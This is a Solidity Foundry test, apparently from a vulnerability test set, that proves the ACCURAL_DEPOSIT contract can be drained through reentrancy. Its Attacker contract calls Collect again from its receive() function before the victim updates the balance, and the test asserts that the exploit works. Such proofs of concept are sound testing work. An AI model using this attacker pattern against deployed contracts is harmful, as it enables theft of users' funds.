
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ACCURAL_DEPOSIT, LogFile} from "../src/ACCURAL_DEPOSIT.sol";

contract TestReentrancyACCURAL_DEPOSIT is Test {

    ACCURAL_DEPOSIT public accuralDeposit;
    
    Attacker public _attacker;

    function setUp() public {
        LogFile log = new LogFile();
        vm.etch(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46, address(log).code);
        accuralDeposit = new ACCURAL_DEPOSIT();
        accuralDeposit.Initialized();

        _attacker = new Attacker(address(accuralDeposit));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal >= accuralDeposit.MinSum() && attackVal > 0 && attackVal <= type(uint128).max / 2);
        

        // --- 2. State Configuration (Pre-Condition) ---
        

        // --- 3. Funding ---
        
        // A. Fund the Victim (so it has ETH to steal)
        vm.deal(address(accuralDeposit), attackVal * 2); 
        
        // B. Fund the Attacker (redundancy)
        vm.deal(address(_attacker), attackVal * 2);

        // C. CRITICAL: Fund the Test Contract (address(this))
        // The test contract needs funds because it sends 'attackVal' to the Attacker in the setup step below.
        // Without this, the test will fail with 'EvmError: OutOfFunds' if attackVal > default test balance.
        vm.deal(address(this), attackVal * 2);

        
        
        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    // Keep this so the test contract can receive Ether from the contract being tested on the "positive" scenario
    receive() external payable {}
}

contract Attacker {
    ACCURAL_DEPOSIT public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;
    bool public reenteredBeforeUpdate;

    constructor(address victimAddress) { 
        victim = ACCURAL_DEPOSIT(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        reenteredBeforeUpdate = false;
        
        storedVal = val;
        victim.Deposit{value: val * 2}();
    }

    function attack(uint256 val) public {
        initialSnapshot = victim.balances(address(this));

        victim.Collect(val);

        if (reenteredBeforeUpdate && attackCallCount == 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            if (victim.balances(address(this)) == initialSnapshot) {
                reenteredBeforeUpdate = true;
            }
            victim.Collect(storedVal);
        }
    }
}
